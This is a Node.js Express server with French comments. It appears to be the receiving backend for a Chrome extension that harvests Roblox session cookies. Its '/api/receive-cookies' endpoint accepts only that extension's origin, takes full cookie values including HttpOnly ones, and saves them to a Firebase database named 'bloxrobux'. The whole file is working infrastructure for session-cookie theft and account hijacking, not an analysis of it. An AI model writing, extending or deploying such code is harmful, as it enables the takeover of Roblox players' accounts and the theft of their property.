const express = require("express");
const cors = require("cors");
const admin = require("firebase-admin");

const app = express();

// 🔒 ID de l’extension Chrome autorisée
const ALLOWED_ORIGIN = "chrome-extension://bepinomhmhjfkfijfnkigboednbgggol";

// --- CORS ---
app.use(cors({
  origin: ALLOWED_ORIGIN
}));

app.use(express.json({ limit: "2mb" }));

// --- Firebase init ---
if (!admin.apps.length) {
  admin.initializeApp({
    credential: admin.credential.cert(
      JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT)
    ),
    databaseURL: "https://bloxrobux-e9244-default-rtdb.europe-west1.firebasedatabase.app" // ⬅️ remplace
  });
}

const db = admin.database();

// --- Endpoint réception cookies ---
app.post("/api/receive-cookies", async (req, res) => {
  if (req.headers.authorization !== "Bearer SUPER_SECRET_TOKEN") {
    return res.status(401).json({ error: "Unauthorized" });
  }

  const cookies = req.body;

  if (!Array.isArray(cookies)) {
    return res.status(400).json({ error: "Bad request: cookies should be an array" });
  }

  console.log("=== Cookies Roblox reçus ===");

  cookies.forEach(c => {
    const preview = c.value ? c.value.slice(0, 4) + "..." : "";
    console.log(`${c.name} = ${preview} (HttpOnly: ${c.httpOnly}, Domain: ${c.domain})`);
  });

  // 🔥 Sauvegarde Firebase
  try {
    await db.ref("roblox/cookies").set({
      updatedAt: Date.now(),
      cookies: cookies.map(c => ({
        name: c.name,
        value: c.value,
        httpOnly: c.httpOnly,
        domain: c.domain
      }))
    });
  } catch (err) {
    console.error("Erreur Firebase :", err);
    return res.status(500).json({ error: "Firebase error" });
  }

  res.json({ ok: true, received: cookies.length });
});

// --- Lancement serveur ---
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`✅ Serveur en ligne sur le port ${PORT}`);
});

